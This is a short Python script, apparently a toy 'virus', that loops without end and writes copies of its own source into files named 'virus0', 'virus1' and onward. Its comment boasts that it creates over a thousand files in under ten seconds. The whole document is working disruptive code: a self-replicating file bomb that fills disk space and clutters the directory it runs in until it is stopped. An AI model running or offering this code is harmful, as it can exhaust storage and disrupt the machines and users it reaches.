#This code will create 1K+ files under 10s
indicator = 0

while True:
    with open("virus{0}".format(indicator), "w") as f:
        f.write(open(__file__).read())
        f.close()
        indicator += 1
